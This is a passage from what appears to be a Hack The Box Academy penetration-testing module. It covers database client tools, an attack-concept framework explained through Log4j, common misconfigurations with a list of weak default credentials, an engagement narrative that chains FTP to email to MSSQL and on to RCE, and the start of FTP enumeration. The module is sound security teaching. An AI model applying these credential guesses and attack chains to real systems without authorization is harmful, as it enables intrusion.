</tr>
<tr>
<td><code>3.</code></td>
<td>Programming Languages</td>
</tr>
</tbody>
</table>
<p><strong>MySQL example</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/3\_way\_to\_interact\_with\_MySQL.png" alt="text"></p>
<p>Let&#39;s explore command-line utilities and a GUI application.</p>
<hr>
<h3 id="command-line-utilities">Command Line Utilities</h3>
<p><strong>MSSQL</strong></p>
<p>To interact with <a href="https://www.microsoft.com/en-us/sql-server/sql-server-downloads">MSSQL (Microsoft SQL Server)</a> with Linux we can use <a href="https://en.wikipedia.org/wiki/Sqsh">sqsh</a> or <a href="https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility">sqlcmd</a> if you are using Windows. <code>Sqsh</code> is much more than a friendly prompt. It is intended to provide much of the functionality provided by a command shell, such as variables, aliasing, redirection, pipes, back-grounding, job control, history, command substitution, and dynamic configuration. We can start an interactive SQL session as follows:</p>
<p><strong>Linux - SQSH</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sqsh -S <span class="hljs-number">10.129</span><span class="hljs-number">.20</span><span class="hljs-number">.13</span> -U username -P Password123
</code></pre>
<p>The <code>sqlcmd</code> utility lets you enter Transact-SQL statements, system procedures, and script files through a variety of available modes:</p>
<ul>
<li>At the command prompt.</li>
<li>In Query Editor in SQLCMD mode.</li>
<li>In a Windows script file.</li>
<li>In an operating system (Cmd.exe) job step of a SQL Server Agent job.</li>
</ul>
<p><strong>Windows - SQLCMD</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">sqlcmd</span> <span class="hljs-selector-tag">-S</span> 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.20</span><span class="hljs-selector-class">.13</span> <span class="hljs-selector-tag">-U</span> <span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">-P</span> <span class="hljs-selector-tag">Password123</span>
</code></pre>
<p>To learn more about <code>sqlcmd</code> usage, you can see <a href="https://docs.microsoft.com/en-us/sql/ssms/scripting/sqlcmd-use-the-utility">Microsoft documentation</a>.</p>
<p><strong>MySQL</strong></p>
<p>To interact with <a href="https://en.wikipedia.org/wiki/MySQL">MySQL</a>, we can use MySQL binaries for Linux (<code>mysql</code>) or Windows (<code>mysql.exe</code>). MySQL comes pre-installed on some Linux distributions, but we can install MySQL binaries for Linux or Windows using this <a href="https://dev.mysql.com/doc/mysql-getting-started/en/#mysql-getting-started-installing">guide</a>. Start an interactive SQL Session using Linux:</p>
<p><strong>Linux - MySQL</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ mysql -u username -pPassword123 -h <span class="hljs-number">10.129</span><span class="hljs-number">.20</span><span class="hljs-number">.13</span>
</code></pre>
<p>We can easily start an interactive SQL Session using Windows:</p>
<p><strong>Windows - MySQL</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-cmd-session"><span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">mysql</span><span class="hljs-selector-class">.exe</span> <span class="hljs-selector-tag">-u</span> <span class="hljs-selector-tag">username</span> <span class="hljs-selector-tag">-pPassword123</span> <span class="hljs-selector-tag">-h</span> 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.20</span><span class="hljs-selector-class">.13</span>
</code></pre>
<p><strong>GUI Application</strong></p>
<p>Database engines commonly have their own GUI application. MySQL has <a href="https://dev.mysql.com/downloads/workbench/">MySQL Workbench</a> and MSSQL has <a href="https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms">SQL Server Management Studio or SSMS</a>, we can install those tools in our attack host and connect to the database. SSMS is only supported in Windows. An alternative is to use community tools such as <a href="https://github.com/dbeaver/dbeaver">dbeaver</a>. <a href="https://github.com/dbeaver/dbeaver">dbeaver</a> is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.</p>
<p>To install <a href="https://github.com/dbeaver/dbeaver">dbeaver</a> using a Debian package we can download the release .deb package from <a href="https://github.com/dbeaver/dbeaver/releases">https://github.com/dbeaver/dbeaver/releases</a> and execute the following command:</p>
<p><strong>Install dbeaver</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo dpkg -i dbeaver-&lt;version&gt;.deb
</code></pre>
<p>To start the application use:</p>
<p><strong>Run dbeaver</strong></p>
<p>Interacting with Common Services</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ dbeaver &amp;
</code></pre>
<p>To connect to a database, we will need a set of credentials, the target IP and port number of the database, and the database engine we are trying to connect to (MySQL, MSSQL, or another).</p>
<p><strong>Video - Connecting to MSSQL DB using dbeaver</strong></p>
<p>Click on the image below for a short video demonstration of connecting to an MSSQL database using <code>dbeaver</code>.</p>
<p><a href="https://www.youtube.com/watch?v=gU6iQP5rFMw"><img src="https://academy.hackthebox.com/storage/modules/116/ConnectToMSSQL.jpg" alt="MSSQL"></a></p>
<p>Click on the image below for a short video demonstration of connecting to a MySQL database using <code>dbeaver</code>.</p>
<p><strong>Video - Connecting to MySQL DB using dbeaver</strong></p>
<p><a href="https://www.youtube.com/watch?v=PeuWmz8S6G8"><img src="https://academy.hackthebox.com/storage/modules/116/ConnectToMYSQL.jpg" alt="MYSQL"></a></p>
<p>Once we have access to the database using a command-line utility or a GUI application, we can use common <a href="https://docs.microsoft.com/en-us/sql/t-sql/statements/statements?view=sql-server-ver15">Transact-SQL statements</a> to enumerate databases and tables containing sensitive information such as usernames and passwords. If we have the correct privileges, we could potentially execute commands as the MSSQL service account. Later in this module, we will discuss common Transact-SQL statements and attacks for MSSQL &amp; MySQL databases.</p>
<p><strong>Tools</strong></p>
<p>It is crucial to get familiar with the default command-line utilities available to interact with different services. However, as we move forward in the field, we will find tools that can help us be more efficient. The community commonly creates those tools. Although, eventually, we will have ideas on how a tool can be improved or for creating our own tools, even if we are not full-time developers, the more we get familiar with hacking. The more we learn, the more we find ourselves looking for a tool that does not exist, which may be an opportunity to learn and create our tools.</p>
<p><strong>Tools to Interact with Common Services</strong></p>
<table>
<thead>
<tr>
<th><strong>SMB</strong></th>
<th><strong>FTP</strong></th>
<th><strong>Email</strong></th>
<th><strong>Databases</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a></td>
<td><a href="https://linux.die.net/man/1/ftp">ftp</a></td>
<td><a href="https://www.thunderbird.net/en-US/">Thunderbird</a></td>
<td><a href="https://github.com/dbcli/mssql-cli">mssql-cli</a></td>
</tr>
<tr>
<td><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></td>
<td><a href="https://lftp.yar.ru/">lftp</a></td>
<td><a href="https://www.claws-mail.org/">Claws</a></td>
<td><a href="https://github.com/dbcli/mycli">mycli</a></td>
</tr>
<tr>
<td><a href="https://github.com/ShawnDEvans/smbmap">SMBMap</a></td>
<td><a href="https://www.ncftp.com/">ncftp</a></td>
<td><a href="https://wiki.gnome.org/Apps/Geary">Geary</a></td>
<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py">mssqlclient.py</a></td>
</tr>
<tr>
<td><a href="https://github.com/SecureAuthCorp/impacket">Impacket</a></td>
<td><a href="https://filezilla-project.org/">filezilla</a></td>
<td><a href="https://getmailspring.com/">MailSpring</a></td>
<td><a href="https://github.com/dbeaver/dbeaver">dbeaver</a></td>
</tr>
<tr>
<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a></td>
<td><a href="http://www.crossftp.com/">crossftp</a></td>
<td><a href="http://www.mutt.org/">mutt</a></td>
<td><a href="https://dev.mysql.com/downloads/workbench/">MySQL Workbench</a></td>
</tr>
<tr>
<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">smbexec.py</a></td>
<td></td>
<td><a href="https://mailutils.org/">mailutils</a></td>
<td><a href="https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms">SQL Server Management Studio or SSMS</a></td>
</tr>
<tr>
<td></td>
<td></td>
<td><a href="https://github.com/mogaal/sendemail">sendEmail</a></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td><a href="http://www.jetmore.org/john/code/swaks/">swaks</a></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td><a href="https://en.wikipedia.org/wiki/Sendmail">sendmail</a></td>
</tr>
</tbody>
</table>
<hr>
<h3 id="general-troubleshooting">General Troubleshooting</h3>
<p>Depending on the Windows or Linux version we are working with or targetting, we may encounter different problems when attempting to connect to a service.</p>
<p>Some reasons why we may not have access to a resource:</p>
<ul>
<li>Authentication</li>
<li>Privileges</li>
<li>Network Connection</li>
<li>Firewall Rules</li>
<li>Protocol Support</li>
</ul>
<p>Keep in mind that we may encounter different errors depending on the service we are targeting. We can use the error codes to our advantage and search for official documentation or forums where people solved an issue similar to ours.</p>
<h2 id="the-concept-of-attacks">The Concept of Attacks</h2>
<hr>
<p>To effectively understand attacks on the different services, we should look at how these services can be attacked. A concept is an outlined plan that is applied to future projects. As an example, we can think of the concept of building a house. Many houses have a basement, four walls, and a roof. Most homes are built this way, and it is a concept that is applied all over the world. The finer details, such as the material used or the type of design, are flexible and can be adapted to individual wishes and circumstances. This example shows that a concept needs a general categorization (floor, walls, roof).</p>
<p>In our case, we need to create a concept for the attacks on all possible services and divide it into categories that summarize all services but leave the individual attack methods.</p>
<p>To explain a little more clearly what we are talking about here, we can try to group the services SSH, FTP, SMB, and HTTP ourselves and figure out what these services have in common. Then we need to create a structure that will allow us to identify the attack points of these different services using a single pattern.</p>
<p>Analyzing commonalities and creating pattern templates that fit all conceivable cases is not a finished product but rather a process that makes these pattern templates grow larger and larger. Therefore, we have created a pattern template for this topic for you to better and more efficiently teach and explain the concept behind the attacks.</p>
<p><strong>The Concept of Attacks</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/attack\_concept2.png" alt=""></p>
<p>The concept is based on four categories that occur for each vulnerability. First, we have a <code>Source</code> that performs the specific request to a <code>Process</code> where the vulnerability gets triggered. Each process has a specific set of <code>Privileges</code> with which it is executed. Each process has a task with a specific goal or <code>Destination</code> to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.</p>
<p>Every task and piece of information follows a specific pattern, a cycle, which we have deliberately made linear. This is because the <code>Destination</code> does not always serve as a <code>Source</code> and is therefore not treated as a source of a new task.</p>
<p>For any task to come into existence at all, it needs an idea, information (<code>Source</code>), a planned process for it (<code>Processes</code>), and a specific goal (<code>Destination</code>) to be achieved. Therefore, the category of <code>Privileges</code> is necessary to control information processing appropriately.</p>
<hr>
<h3 id="source">Source</h3>
<p>We can generalize <code>Source</code> as a source of information used for the specific task of a process. There are many different ways to pass information to a process. The graphic shows some of the most common examples of how information is passed to the processes.</p>
<table data-header-hidden><thead><tr><th width="202"></th><th></th></tr></thead><tbody><tr><td><strong>Information Source</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Code</code></td><td>This means that the already executed program code results are used as a source of information. These can come from different functions of a program.</td></tr><tr><td><code>Libraries</code></td><td>A library is a collection of program resources, including configuration data, documentation, help data, message templates, prebuilt code and subroutines, classes, values, or type specifications.</td></tr><tr><td><code>Config</code></td><td>Configurations are usually static or prescribed values that determine how the process processes information.</td></tr><tr><td><code>APIs</code></td><td>The application programming interface (API) is mainly used as the interface of programs for retrieving or providing information.</td></tr><tr><td><code>User Input</code></td><td>If a program has a function that allows the user to enter specific values used to process the information accordingly, this is the manual entry of information by a person.</td></tr></tbody></table>

<p>The source is, therefore, the source that is exploited for vulnerabilities. It does not matter which protocol is used because HTTP header injections can be manipulated manually, as can buffer overflows. The source for this can therefore be categorized as <code>Code</code>. So let us take a closer look at the pattern template based on one of the latest critical vulnerabilities that most of us have heard of.</p>
<p><strong>Log4j</strong></p>
<p>A great example is the critical Log4j vulnerability (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-44228">CVE-2021-44228</a>) which was published at the end of 2021. Log4j is a framework or <code>Library</code> used to log application messages in Java and other programming languages. This library contains classes and functions that other programming languages can integrate. For this purpose, information is documented, similar to a logbook. Furthermore, the scope of the documentation can be configured extensively. As a result, it has become a standard within many open source and commercial software products. In this example, an attacker can manipulate the HTTP User-Agent header and insert a JNDI lookup as a command intended for the Log4j <code>library</code>. Accordingly, not the actual User-Agent header, such as Mozilla 5.0, is processed, but the JNDI lookup.</p>
<hr>
<h3 id="processes">Processes</h3>
<p>The <code>Process</code> is about processing the information forwarded from the source. These are processed according to the intended task determined by the program code. For each task, the developer specifies how the information is processed. This can occur using classes with different functions, calculations, and loops. The variety of possibilities for this is as diverse as the number of developers in the world. Accordingly, most of the vulnerabilities lie in the program code executed by the process.</p>
<table data-header-hidden><thead><tr><th width="247"></th><th></th></tr></thead><tbody><tr><td><strong>Process Components</strong></td><td><strong>Description</strong></td></tr><tr><td><code>PID</code></td><td>The Process-ID (PID) identifies the process being started or is already running. Running processes have already assigned privileges, and new ones are started accordingly.</td></tr><tr><td><code>Input</code></td><td>This refers to the input of information that could be assigned by a user or as a result of a programmed function.</td></tr><tr><td><code>Data processing</code></td><td>The hard-coded functions of a program dictate how the information received is processed.</td></tr><tr><td><code>Variables</code></td><td>The variables are used as placeholders for information that different functions can further process during the task.</td></tr><tr><td><code>Logging</code></td><td>During logging, certain events are documented and, in most cases, stored in a register or a file. This means that certain information remains in the system.</td></tr></tbody></table>

<p><strong>Log4j</strong></p>
<p>The process of Log4j is to log the User-Agent as a string using a function and store it in the designated location. The vulnerability in this process is the misinterpretation of the string, which leads to the execution of a request instead of logging the events. However, before we go further into this function, we need to talk about privileges.</p>
<hr>
<h3 id="privileges">Privileges</h3>
<p><code>Privileges</code> are present in any system that controls processes. These serve as a type of permission that determines what tasks and actions can be performed on the system. In simple terms, it can be compared to a bus ticket. If we use a ticket intended for a particular region, we will be able to use the bus, and otherwise, we will not. These privileges (or figuratively speaking, our tickets) can also be used for different means of transport, such as planes, trains, boats, and others. In computer systems, these privileges serve as control and segmentation of actions for which different permissions, controlled by the system, are needed. Therefore, the rights are checked based on this categorization when a process needs to fulfill its task. If the process satisfies these privileges and conditions, the system approves the action requested. We can divide these privileges into the following areas:</p>
<table data-header-hidden><thead><tr><th width="149"></th><th></th></tr></thead><tbody><tr><td><strong>Privileges</strong></td><td><strong>Description</strong></td></tr><tr><td><code>System</code></td><td>These privileges are the highest privileges that can be obtained, which allow any system modification. In Windows, this type of privilege is called <code>SYSTEM</code>, and in Linux, it is called <code>root</code>.</td></tr><tr><td><code>User</code></td><td>User privileges are permissions that have been assigned to a specific user. For security reasons, separate users are often set up for particular services during the installation of Linux distributions.</td></tr><tr><td><code>Groups</code></td><td>Groups are a categorization of at least one user who has certain permissions to perform specific actions.</td></tr><tr><td><code>Policies</code></td><td>Policies determine the execution of application-specific commands, which can also apply to individual or grouped users and their actions.</td></tr><tr><td><code>Rules</code></td><td>Rules are the permissions to perform actions handled from within the applications themselves.</td></tr></tbody></table>

<p><strong>Log4j</strong></p>
<p>What made the Log4j vulnerability so dangerous was the <code>Privileges</code> that the implementation brought. Logs are often considered sensitive because they can contain data about the service, the system itself, or even customers. Therefore, logs are usually stored in locations that no regular user should be able to access. Accordingly, most applications with the Log4j implementation were run with the privileges of an administrator. The process itself exploited the library by manipulating the User-Agent so that the process misinterpreted the source and led to the execution of user-supplied code.</p>
<hr>
<h3 id="destination">Destination</h3>
<p>Every task has at least one purpose and goal that must be fulfilled. Logically, if any data set changes were missing or not stored or forwarded anywhere, the task would be generally unnecessary. The result of such a task is either stored somewhere or forwarded to another processing point. Therefore we speak here of the <code>Destination</code> where the changes will be made. Such processing points can point either to a local or remote process. Therefore, at the local level, local files or records may be modified by the process or be forwarded to other local services for further use. However, this does not exclude the possibility that the same process could reuse the resulting data too. If the process is completed with the data storage or its forwarding, the cycle leading to the task&#39;s completion is closed.</p>
<table data-header-hidden><thead><tr><th width="144"></th><th></th></tr></thead><tbody><tr><td><strong>Destination</strong></td><td><strong>Description</strong></td></tr><tr><td><code>Local</code></td><td>The local area is the system&#39;s environment in which the process occurred. Therefore, the results and outcomes of a task are either processed further by a process that includes changes to data sets or storage of the data.</td></tr><tr><td><code>Network</code></td><td>The network area is mainly a matter of forwarding the results of a process to a remote interface. This can be an IP address and its services or even entire networks. The results of such processes can also influence the route under certain circumstances.</td></tr></tbody></table>

<p><strong>Log4j</strong></p>
<p>The misinterpretation of the User-Agent leads to a JNDI lookup which is executed as a command from the system with administrator privileges and queries a remote server controlled by the attacker, which in our case is the <code>Destination</code> in our concept of attacks. This query requests a Java class created by the attacker and is manipulated for its own purposes. The queried Java code inside the manipulated Java class gets executed in the same process, leading to a remote code execution (<code>RCE</code>) vulnerability.</p>
<p>GovCERT.ch has created an excellent graphical representation of the Log4j vulnerability worth examining in detail.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/116/log4jattack.png" alt=""> Source: <a href="https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/">https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/</a></p>
<p>This graphic breaks down the Log4j JNDI attack based on the <code>Concept of Attacks</code>.</p>
<p><strong>Initiation of the Attack</strong></p>
<table data-header-hidden><thead><tr><th width="96"></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Log4j</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>1.</code></td><td>The attacker manipulates the user agent with a JNDI lookup command.</td><td><code>Source</code></td></tr><tr><td><code>2.</code></td><td>The process misinterprets the assigned user agent, leading to the execution of the command.</td><td><code>Process</code></td></tr><tr><td><code>3.</code></td><td>The JNDI lookup command is executed with administrator privileges due to logging permissions.</td><td><code>Privileges</code></td></tr><tr><td><code>4.</code></td><td>This JNDI lookup command points to the server created and prepared by the attacker, which contains a malicious Java class containing commands designed by the attacker.</td><td><code>Destination</code></td></tr></tbody></table>

<p>This is when the cycle starts all over again, but this time to gain remote access to the target system.</p>
<p><strong>Trigger Remote Code Execution</strong></p>
<table data-header-hidden><thead><tr><th width="101"></th><th width="264"></th><th></th></tr></thead><tbody><tr><td><strong>Step</strong></td><td><strong>Log4j</strong></td><td><strong>Concept of Attacks - Category</strong></td></tr><tr><td><code>5.</code></td><td>After the malicious Java class is retrieved from the attacker&#39;s server, it is used as a source for further actions in the following process.</td><td><code>Source</code></td></tr><tr><td><code>6.</code></td><td>Next, the malicious code of the Java class is read in, which in many cases has led to remote access to the system.</td><td><code>Process</code></td></tr><tr><td><code>7.</code></td><td>The malicious code is executed with administrator privileges due to logging permissions.</td><td><code>Privileges</code></td></tr><tr><td><code>8.</code></td><td>The code leads back over the network to the attacker with the functions that allow the attacker to control the system remotely.</td><td><code>Destination</code></td></tr></tbody></table>

<p>Finally, we see a pattern that we can repeatedly use for our attacks. This pattern template can be used to analyze and understand exploits and debug our own exploits during development and testing. In addition, this pattern template can also be applied to source code analysis, which allows us to check certain functionality and commands in our code step-by-step. Finally, we can also think categorically about each task&#39;s dangers individually.</p>
<h2 id="service-misconfigurations">Service Misconfigurations</h2>
<hr>
<p>Misconfigurations usually happen when a system administrator, technical support, or developer does not correctly configure the security framework of an application, website, desktop, or server leading to dangerous open pathways for unauthorized users. Let&#39;s explore some of the most typical misconfigurations of common services.</p>
<hr>
<h3 id="authentication">Authentication</h3>
<p>In previous years (though we still see this sometimes during assessments), it was widespread for services to include default credentials (username and password). This presents a security issue because many administrators leave the default credentials unchanged. Nowadays, most software asks users to set up credentials upon installation, which is better than default credentials. However, keep in mind that we will still find vendors using default credentials, especially on older applications.</p>
<p>Even when the service does not have a set of default credentials, an administrator may use weak passwords or no passwords when setting up services with the idea that they will change the password once the service is set up and running.</p>
<p>As administrators, we need to define password policies that apply to software tested or installed in our environment. Administrators should be required to comply with a minimum password complexity to avoid user and passwords combinations such as:</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">admin:</span>admin
<span class="hljs-symbol">admin:</span>password
<span class="hljs-symbol">admin:</span><span class="hljs-params">&lt;blank&gt;</span>
<span class="hljs-symbol">root:</span><span class="hljs-number">12345678</span>
<span class="hljs-symbol">administrator:</span>Password
</code></pre>
<p>Once we grab the service banner, the next step should be to identify possible default credentials. If there are no default credentials, we can try the weak username and password combinations listed above.</p>
<p><strong>Anonymous Authentication</strong></p>
<p>Another misconfiguration that can exist in common services is anonymous authentication. The service can be configured to allow anonymous authentication, allowing anyone with network connectivity to the service without being prompted for authentication.</p>
<p><strong>Misconfigured Access Rights</strong></p>
<p>Let&#39;s imagine we retrieved credentials for a user whose role is to upload files to the FTP server but was given the right to read every FTP document. The possibility is endless, depending on what is within the FTP Server. We may find files with configuration information for other services, plain text credentials, usernames, proprietary information, and Personally identifiable information (PII).</p>
<p>Misconfigured access rights are when user accounts have incorrect permissions. The bigger problem could be giving people lower down the chain of command access to private information that only managers or administrators should have.</p>
<p>Administrators need to plan their access rights strategy, and there are some alternatives such as <a href="https://en.wikipedia.org/wiki/Role-based\_access\_control">Role-based access control (RBAC)</a>, <a href="https://en.wikipedia.org/wiki/Access-control\_list">Access control lists (ACL)</a>. If we want more detailed pros and cons of each method, we can read <a href="https://authress.io/knowledge-base/role-based-access-control-rbac">Choosing the best access control strategy</a> by Warren Parad from Authress.</p>
<hr>
<h3 id="unnecessary-defaults">Unnecessary Defaults</h3>
<p>The initial configuration of devices and software may include but is not limited to settings, features, files, and credentials. Those default values are usually aimed at usability rather than security. Leaving it default is not a good security practice for a production environment. Unnecessary defaults are those settings we need to change to secure a system by reducing its attack surface.</p>
<p>We might as well deliver up our company&#39;s personal information on a silver platter if we take the easy road and accept the default settings while setting up software or a device for the first time. In reality, attackers may obtain access credentials for specific equipment or abuse a weak setting by conducting a short internet search.</p>
<p><a href="https://owasp.org/Top10/A05\_2021-Security\_Misconfiguration/">Security Misconfiguration</a> are part of the <a href="https://owasp.org/Top10/">OWASP Top 10 list</a>. Let&#39;s take a look at those related to default values:</p>
<ul>
<li>Unnecessary features are enabled or installed (e.g., unnecessary ports, services, pages, accounts, or privileges).</li>
<li>Default accounts and their passwords are still enabled and unchanged.</li>
<li>Error handling reveals stack traces or other overly informative error messages to users.</li>
<li>For upgraded systems, the latest security features are disabled or not configured securely.</li>
</ul>
<hr>
<h3 id="preventing-misconfiguration">Preventing Misconfiguration</h3>
<p>Once we have figured out our environment, the most straightforward strategy to control risk is to lock down the most critical infrastructure and only allow desired behavior. Any communication that is not required by the program should be disabled. This may include things like:</p>
<ul>
<li>Admin interfaces should be disabled.</li>
<li>Debugging is turned off.</li>
<li>Disable the use of default usernames and passwords.</li>
<li>Set up the server to prevent unauthorized access, directory listing, and other issues.</li>
<li>Run scans and audits regularly to help discover future misconfigurations or missing fixes.</li>
</ul>
<p>The OWASP Top 10 provides a section on how to secure the installation processes:</p>
<ul>
<li>A repeatable hardening process makes it fast and easy to deploy another environment that is appropriately locked down. Development, QA, and production environments should all be configured identically, with different credentials used in each environment. In addition, this process should be automated to minimize the effort required to set up a new secure environment.</li>
<li>A minimal platform without unnecessary features, components, documentation, and samples. Remove or do not install unused features and frameworks.</li>
<li>A task to review and update the configurations appropriate to all security notes, updates, and patches as part of the patch management process (see A06:2021-Vulnerable and Outdated Components). Review cloud storage permissions (e.g., S3 bucket permissions).</li>
<li>A segmented application architecture provides effective and secure separation between components or tenants, with segmentation, containerization, or cloud security groups (ACLs).</li>
<li>Sending security directives to clients, e.g., security headers.</li>
<li>An automated process to verify the effectiveness of the configurations and settings in all environments.</li>
</ul>
<h2 id="finding-sensitive-information">Finding Sensitive Information</h2>
<hr>
<p>When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Therefore, every single piece of information is essential.</p>
<p>Let us imagine we are in an engagement with a client, we are targeting email, FTP, databases, and storage, and our goal is to obtain Remote Code Execution (RCE) on any of these services. We started the enumeration and tried anonymous access to all services, and only FTP has anonymous access. We found an empty file within the FTP service, but with the name <code>johnsmith</code>, we tried <code>johnsmith</code> as the FTP user and password, but it did not work. We try the same against the email service, and we successfully login. With email access, we start searching emails containing the word <code>password</code>, we find many, but one of them contains John&#39;s credentials for the MSSQL database. We access the database and use the built-in functionality to execute commands and successfully get RCE on the database server. We successfully met our goal.</p>
<p>A misconfigured service let us access a piece of information that initially may look insignificant, <code>johnsmith</code>, but that information opened the doors for us to discover more information and finally get remote code execution on the database server. This is the importance of paying attention to every piece of information, every detail, as we enumerate and attack common services.</p>
<p>Sensitive information may include, but is not limited to:</p>
<ul>
<li>Usernames.</li>
<li>Email Addresses.</li>
<li>Passwords.</li>
<li>DNS records.</li>
<li>IP Addresses.</li>
<li>Source code.</li>
<li>Configuration files.</li>
<li>PII.</li>
</ul>
<p>This module will cover some common services where we can find interesting information and discover different methods and tools we can use to automate our discovery process. These services include:</p>
<ul>
<li>File Shares.</li>
<li>Email.</li>
<li>Databases.</li>
</ul>
<hr>
<p><strong>Understanding of What We Have to Look for</strong></p>
<p>Every target is unique, and we need to familiarize ourselves with our target, its processes, procedures, business model, and purpose. Once we understand our target, we can think about what information is essential for them and what kind of information is helpful for our attack.</p>
<p>There are two key elements to finding sensitive information:</p>
<ol>
<li>We need to understand the service and how it works.</li>
<li>We need to know what we are looking for.</li>
</ol>
<h2 id="attacking-ftp">Attacking FTP</h2>
<hr>
<p>The <a href="https://en.wikipedia.org/wiki/File\_Transfer\_Protocol">File Transfer Protocol</a> (<code>FTP</code>) is a standard network protocol used to transfer files between computers. It also performs directory and files operations, such as changing the working directory, listing files, and renaming and deleting directories or files. By default, FTP listens on port <code>TCP/21</code>.</p>
<p>To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Therefore, after gaining access to the FTP Service, we need to be aware of the content in the directory so we can search for sensitive or critical information, as we previously discussed. The protocol is designed to trigger downloads and uploads with commands. Thus, files can be transferred between servers and clients. A file management system is available to the user, known by the operating system. Files can be stored in folders, which may be located in other folders. This results in a hierarchical directory structure. Most companies use this service for software or website development processes.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p><code>Nmap</code> default scripts <code>-sC</code> includes the <a href="https://nmap.org/nsedoc/scripts/ftp-anon.html">ftp-anon</a> Nmap script which checks if a FTP server allows anonymous logins. The version enumeration flag <code>-sV</code> provides interesting information about FTP services, such as the FTP banner, which often includes the version name. We can use the <code>ftp</code> client or <code>nc</code> to interact with the FTP service. By default, FTP runs on TCP port 21.</p>
<p><strong>Nmap</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ sudo nmap -sC -sV -p<span class="hljs-number"> 21 </span>192.168.2.142 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-10 22:04 EDT
Nmap scan report for 192.168.2.142
Host is up (0.00054s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--  <span class="hljs-number"> 1 </span>1170    <span class="hljs-number"> 924 </span>          <span class="hljs-number"> 31 </span>Mar<span class="hljs-number"> 28 </span><span class="hljs-number"> 2001 </span>.banner
| d--x--x--x  <span class="hljs-number"> 2 </span>root     root        <span class="hljs-number"> 1024 </span>Jan<span class="hljs-number"> 14 </span><span class="hljs-number"> 2002 </span>bin
| d--x--x--x  <span class="hljs-number"> 2 </span>root     root        <span class="hljs-number"> 1024 </span>Aug<span class="hljs-number"> 10 </span><span class="hljs-number"> 1999 </span>etc
| drwxr-srwt  <span class="hljs-number"> 2 </span>1170    <span class="hljs-number"> 924 </span>        <span class="hljs-number"> 2048 </span>Jul<span class="hljs-number"> 19 </span>18:48 incoming [NSE: writeable]
| d--x--x--x  <span class="hljs-number"> 2 </span>root     root        <span class="hljs-number"> 1024 </span>Jan<span class="hljs-number"> 14 </span><span class="hljs-number"> 2002 </span>lib
| drwxr-sr-x  <span class="hljs-number"> 2 </span>1170    <span class="hljs-number"> 924 </span>        <span class="hljs-number"> 1024 </span>Aug <span class="hljs-number"> 5 </span><span class="hljs-number"> 2004 </span>pub
|_Only<span class="hljs-number"> 6 </span>shown. Use --script-args ftp-anon.maxlist=-1 to see all.
</code></pre>
<hr>
<h3 id="misconfigurations">Misconfigurations</h3>
<p>As we discussed, anonymous authentication can be configured for different services such as FTP. To access with anonymous login, we can use the <code>anonymous</code> username and no password. This will be dangerous for the company if read and write permissions have not been set up correctly for the FTP service. Because with the anonymous login, the company could have stored sensitive information in a folder that the anonymous user of the FTP service could have access to.</p>
<p>This would enable us to download this sensitive information or even upload dangerous scripts. Using other vulnerabilities, such as path traversal in a web application, we would be able to find out where this file is located and execute it as PHP code, for example.</p>
<p><strong>Anonymous Authentication</strong></p>
<pre><code class="lang-shell-session">[!bash!]$ ftp <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.142</span>    

<span class="hljs-symbol">Connected</span> to <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.142</span>.
<span class="hljs-number">220</span> (vsFTPd <span class="hljs-number">2.3</span><span class="hljs-number">.4</span>)
<span class="hljs-symbol">Name</span> (<span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.142</span>:kali): anonymous
<span class="hljs-number">331</span> <span class="hljs-symbol">Please</span> specify the password.
